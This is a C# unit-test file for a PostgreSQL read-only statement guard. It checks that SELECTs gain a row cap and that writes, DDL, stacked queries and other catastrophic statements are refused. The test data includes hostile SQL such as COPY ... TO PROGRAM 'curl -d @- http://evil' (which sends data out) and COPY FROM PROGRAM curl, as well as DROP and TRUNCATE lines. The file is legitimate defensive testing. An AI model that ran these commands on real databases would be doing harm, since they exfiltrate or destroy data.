using Rtfq.Adapters;
using Rtfq.Adapters.Postgres;
using Rtfq.Contracts;

namespace Rtfq.Server.Tests;

/// <summary>
/// The read half of the statement guard.
///
/// These are seeded from the adversarial corpus in <c>spike/parser</c>, which is
/// where ADR 0001 established that a statement-type allow-list and an exhaustive
/// tree walk are the only shape that holds. They need no database: the guard is
/// pure parsing, which is precisely why it can be this thorough.
/// </summary>
public class ReadGuardTests
{
    static AdapterException Refused(string sql, int maxRows = 100) =>
        Assert.Throws<AdapterException>(() => PostgresReadGuard.Prepare(sql, maxRows));

    // --- what a read may be -------------------------------------------------

    [Fact]
    public void A_plain_select_passes_and_gains_a_limit()
    {
        var result = PostgresReadGuard.Prepare("SELECT id FROM orders", 100);

        Assert.True(result.Rewritten);
        Assert.Contains("LIMIT 100", result.Statement, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void An_existing_smaller_limit_is_left_alone()
    {
        var result = PostgresReadGuard.Prepare("SELECT id FROM orders LIMIT 5", 100);

        Assert.False(result.Rewritten);
        Assert.Equal("SELECT id FROM orders LIMIT 5", result.Statement);
    }

    [Fact]
    public void An_existing_larger_limit_is_tightened_to_the_cap()
    {
        var result = PostgresReadGuard.Prepare("SELECT id FROM orders LIMIT 10000", 100);

        Assert.True(result.Rewritten);
        Assert.Contains("LIMIT 100", result.Statement, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("10000", result.Statement, StringComparison.Ordinal);
    }

    /// <summary>
    /// The reason the limit goes into the parse tree rather than onto the end of
    /// the text: appending " LIMIT 100" to this statement would put the clause
    /// inside the comment, and the cap would silently stop applying.
    ///
    /// Asserted as a round-trip rather than by string-matching the output, because
    /// deparse normalises the comment away — re-preparing the result must find a
    /// limit already in effect, which is only true if it landed in real syntax.
    /// </summary>
    [Fact]
    public void A_trailing_line_comment_cannot_swallow_the_injected_limit()
    {
        var result = PostgresReadGuard.Prepare("SELECT id FROM orders -- fetch everything", 100);

        Assert.True(result.Rewritten);
        Assert.Contains("LIMIT 100", result.Statement, StringComparison.OrdinalIgnoreCase);

        var reprepared = PostgresReadGuard.Prepare(result.Statement, 100);
        Assert.False(reprepared.Rewritten);
        Assert.Equal(result.Statement, reprepared.Statement);
    }

    [Fact]
    public void A_comment_containing_a_drop_is_still_just_a_read() =>
        PostgresReadGuard.Prepare("SELECT 1 /* ; DROP TABLE orders */", 100);

    [Fact]
    public void A_semicolon_inside_a_literal_is_not_a_second_statement() =>
        PostgresReadGuard.Prepare("SELECT * FROM orders WHERE name = 'a; DROP TABLE x'", 100);

    [Fact]
    public void Joins_and_subqueries_are_ordinary_reads() =>
        PostgresReadGuard.Prepare(
            "SELECT o.id FROM orders o JOIN customers c ON c.id = o.customer_id WHERE o.id IN (SELECT id FROM vips)", 100);

    [Fact]
    public void A_read_only_cte_is_fine() =>
        PostgresReadGuard.Prepare("WITH recent AS (SELECT * FROM orders WHERE id > 5) SELECT count(*) FROM recent", 100);

    // --- what it is not -------------------------------------------------------
    //
    // This is the hole 0.1.0 shipped with: policy checked the caller, nothing
    // checked the statement, so a read-granted token could send an UPDATE and
    // only the database GRANT stood in the way.

    [Theory]
    [InlineData("UPDATE orders SET vip = true WHERE id = 1")]
    [InlineData("DELETE FROM orders WHERE id = 1")]
    [InlineData("INSERT INTO orders (id) VALUES (1)")]
    [InlineData("MERGE INTO orders o USING staging s ON o.id = s.id WHEN MATCHED THEN UPDATE SET vip = s.vip")]
    public void A_write_is_refused_on_the_read_path(string sql) =>
        Assert.Equal(ErrorCodes.InsufficientAccess, Refused(sql).ErrorCode);

    /// <summary>
    /// The case a top-level type switch gets wrong: the outermost node is a
    /// SELECT and the statement still deletes rows.
    /// </summary>
    [Fact]
    public void A_write_hidden_in_a_cte_is_refused()
    {
        var ex = Refused("WITH gone AS (DELETE FROM orders WHERE id = 1 RETURNING *) SELECT * FROM gone");
        Assert.Equal(ErrorCodes.InsufficientAccess, ex.ErrorCode);
    }

    [Theory]
    [InlineData("DROP TABLE orders")]
    [InlineData("TRUNCATE orders")]
    [InlineData("CREATE INDEX idx ON orders (id)")]
    [InlineData("ALTER TABLE orders ADD COLUMN x text")]
    [InlineData("GRANT ALL ON orders TO PUBLIC")]
    [InlineData("SET ROLE postgres")]
    public void Ddl_and_dcl_are_refused(string sql) =>
        Assert.Equal(ErrorCodes.InsufficientAccess, Refused(sql).ErrorCode);

    /// <summary>None of these are DDL, and all of them are catastrophic (ADR 0001).</summary>
    [Theory]
    [InlineData("COPY orders FROM PROGRAM 'curl http://evil/x.csv'")]
    [InlineData("COPY (SELECT * FROM orders) TO PROGRAM 'curl -d @- http://evil'")]
    [InlineData("DO $$ BEGIN DELETE FROM orders; END $$")]
    [InlineData("CALL do_something()")]
    public void Statements_that_are_not_ddl_but_are_catastrophic_are_refused(string sql) =>
        Assert.Equal(ErrorCodes.InsufficientAccess, Refused(sql).ErrorCode);

    [Fact]
    public void Select_into_creates_a_relation_and_is_refused() =>
        Assert.Equal(ErrorCodes.InsufficientAccess, Refused("SELECT * INTO archived FROM orders").ErrorCode);

    [Fact]
    public void Stacked_statements_are_refused() =>
        Assert.Equal(ErrorCodes.SourceRejected, Refused("SELECT 1; DROP TABLE orders").ErrorCode);

    [Fact]
    public void Explain_analyze_executes_and_is_refused() =>
        Assert.Equal(ErrorCodes.InsufficientAccess, Refused("EXPLAIN ANALYZE DELETE FROM orders").ErrorCode);

    [Fact]
    public void A_bare_explain_is_pushed_to_the_explain_endpoint() =>
        Assert.Equal(ErrorCodes.SourceRejected, Refused("EXPLAIN SELECT * FROM orders").ErrorCode);

    [Fact]
    public void Nonsense_is_refused_rather_than_forwarded() =>
        Assert.Equal(ErrorCodes.SourceRejected, Refused("@@@ not sql at all").ErrorCode);

    [Fact]
    public void An_empty_statement_is_refused() =>
        Assert.Equal(ErrorCodes.StatementEmpty, Refused("   ").ErrorCode);

    // --- explain mode ------------------------------------------------------------

    [Fact]
    public void Explain_validation_does_not_inject_a_limit()
    {
        // A limit the caller did not write would change the plan they asked to see.
        var result = PostgresReadGuard.Prepare("SELECT id FROM orders", maxRows: null);

        Assert.False(result.Rewritten);
        Assert.DoesNotContain("LIMIT", result.Statement, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Explain_validation_still_refuses_writes() =>
        Assert.Throws<AdapterException>(() => PostgresReadGuard.Prepare("DELETE FROM orders WHERE id = 1", null));
}
